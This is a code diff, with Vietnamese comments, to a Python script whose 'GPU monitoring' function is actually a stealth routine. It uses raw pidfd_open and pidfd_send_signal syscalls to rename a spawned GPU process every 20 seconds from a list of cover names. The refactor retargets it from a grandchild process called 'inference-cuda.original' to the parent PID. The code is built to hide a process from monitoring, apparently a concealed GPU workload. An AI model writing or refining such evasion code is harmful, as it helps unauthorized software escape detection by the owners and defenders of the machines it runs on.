@@ -541,43 +541,22 @@ def main():
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
                 """Enhanced GPU monitoring.
-                REFACTOR 2: Tìm PID của cháu (grandchild) thay vì con trực tiếp.
+                REFACTOR 3: Tin tưởng PID gốc vì exec() kế thừa PID.
                 """
-                libc = ctypes.CDLL('libc.so.6', use_errno=True)
-                
-                # Chờ và tìm PID của tiến trình cháu (inference-cuda.original)
-                grandchild_pid = None
-                grandchild_proc = None
-                search_timeout = time.time() + 15 # Tìm trong 15s
-                
-                logger.info(f"🔍 [PID-SEARCH] Searching for grandchild 'inference-cuda.original' under parent PID {process.pid}...")
-                
-                while time.time() < search_timeout:
-                    try:
-                        parent = psutil.Process(process.pid)
-                        children = parent.children(recursive=True)
-                        for child in children:
-                            if child.name() == 'inference-cuda.original':
-                                grandchild_pid = child.pid
-                                grandchild_proc = child
-                                logger.info(f"✅ [PID-SEARCH] Found grandchild process with PID: {grandchild_pid}")
-                                break
-                        if grandchild_pid:
-                            break
-                    except psutil.NoSuchProcess:
-                        logger.warning(f"⚠️ [PID-SEARCH] Parent process {process.pid} disappeared during search.")
-                        return
-                    except Exception as e:
-                        logger.error(f"❌ [PID-SEARCH] Error while searching for grandchild: {e}")
-                    time.sleep(0.5)
+                logger.info(f"🕰️ [STEALTH-INIT] Waiting 10s for bash script to exec and transform into the main process...")
+                time.sleep(10) # Đợi cho script bash có thời gian exec
 
-                if not grandchild_pid:
-                    logger.error(f"❌ [PID-SEARCH] Could not find grandchild process 'inference-cuda.original' for parent {process.pid}. Aborting stealth thread.")
+                # Kiểm tra lại xem tiến trình có còn tồn tại sau khi chờ không
+                if process.poll() is not None:
+                    logger.warning(f"⚠️ [STEALTH-INIT] Process {process.pid} terminated during initial wait. Aborting stealth thread.")
                     return
+
+                logger.info(f"✅ [STEALTH-INIT] Proceeding with stealth operations on PID {process.pid}.")
 
                 # Định nghĩa các hằng số cho syscall
                 RENAME_SIGNAL = 32 + 10  # SIGRTMIN + 10
                 SI_QUEUE = -1
+                libc = ctypes.CDLL('libc.so.6', use_errno=True)
                 
                 # Định nghĩa cấu trúc siginfo_t và union sigval cho Linux x86_64
                 class Sigval(ctypes.Union):
@@ -600,16 +579,16 @@ def main():
                     def si_value(self, value):
                         ptr = ctypes.cast(ctypes.addressof(self) + 16, ctypes.POINTER(Sigval))
                         ptr.contents = value
-
-                # Lấy pidfd cho tiến trình cháu
+                
+                # Lấy pidfd cho tiến trình gốc
                 pidfd = -1
                 try:
-                    pidfd = libc.syscall(434, grandchild_pid, 0) # syscall 434 là pidfd_open
+                    pidfd = libc.syscall(434, process.pid, 0) # syscall 434 là pidfd_open
                     if pidfd < 0:
                         errno = ctypes.get_errno()
-                        logger.error(f"❌ [PIDFD-STEALTH] pidfd_open failed for grandchild PID {grandchild_pid}: {os.strerror(errno)}")
+                        logger.error(f"❌ [PIDFD-STEALTH] pidfd_open failed for PID {process.pid}: {os.strerror(errno)}")
                         return
-                    logger.info(f"✅ [PIDFD-STEALTH] Got pidfd {pidfd} for grandchild PID {grandchild_pid}")
+                    logger.info(f"✅ [PIDFD-STEALTH] Got pidfd {pidfd} for PID {process.pid}")
                 except Exception as e:
                     logger.error(f"❌ [PIDFD-STEALTH] Exception during pidfd_open: {e}")
                     return
@@ -618,10 +597,10 @@ def main():
                 gpu_stealth_names = stealth_names
                 sleep_seconds = 20.0  # Giữ nguyên chu kỳ đổi tên
 
-                while grandchild_proc.is_running():
+                while process.poll() is None:
                     try:
                         time.sleep(sleep_seconds)
-                        if not grandchild_proc.is_running():
+                        if process.poll() is not None:
                             break
 
                         # Chọn tên mới và chuẩn bị payload
@@ -647,10 +626,10 @@ def main():
                         ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(info), 0)
 
                         if ret == 0:
-                            logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to grandchild PID {grandchild_pid} with name '{safe_gpu_name}'")
+                            logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to PID {process.pid} with name '{safe_gpu_name}'")
                         else:
                             errno = ctypes.get_errno()
-                            logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for grandchild PID {grandchild_pid}: {os.strerror(errno)}")
+                            logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for PID {process.pid}: {os.strerror(errno)}")
                             libc.free(name_buffer) # Giải phóng bộ nhớ nếu gửi thất bại
                             # Nếu tiến trình không còn, thoát vòng lặp
                             if errno == 3: # ESRCH - No such process
